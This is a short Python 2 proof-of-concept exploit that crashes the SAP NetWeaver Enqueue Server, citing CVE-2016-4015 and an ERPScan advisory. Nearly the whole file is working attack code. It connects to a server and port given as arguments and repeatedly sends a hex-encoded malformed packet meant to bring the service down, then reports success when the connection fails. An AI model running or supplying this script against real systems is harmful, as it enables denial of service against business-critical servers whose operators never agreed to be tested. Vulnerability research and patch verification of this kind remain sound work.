import socket
from sys import argv

poc = "00000059abcd" \
      "e12300000000" \
      "000000590000" \
      "0059f3a081bb" \
      "060100000000" \
      "000600000000" \
      "000400000000" \
      "000100040000" \
      "000000035661" \
      "6861676e2d70" \
      "635f35323736" \
      "5f3000000000" \
      "020000003b00" \
      "000005000000" \
      "030000000600" \
      "00000400000001"

def main(server, port):
    print (
"""Vulnerability advisory https://erpscan.com/advisories/erpscan-16-019-sap-netweaver-enqueue-server-dos-vulnerability/
Vulnerability ID CVE-2016-4015
Enqueue server connector https://github.com/CoreSecurity/pysap/blob/master/examples/enqueue_monitor.py\n\n""")
    for i in range(10):
        try:
            sock = socket.socket()
            print "Tried DoS to Enqueue Server"
            sock.connect((server, port))
            sock.send(poc.decode("hex"))
            data = sock.recv(1024)
            sock.close()
        except:
            print "Enqueue Server successfully crashed or network error"
            exit()
    print "Not vulnerable"

if __name__ == "__main__":
    if len(argv)<2:
        print "missing parameters, example for execute : ./dos_exploit.py server_ip server_port"
        exit()
    main(argv[1],argv[2])
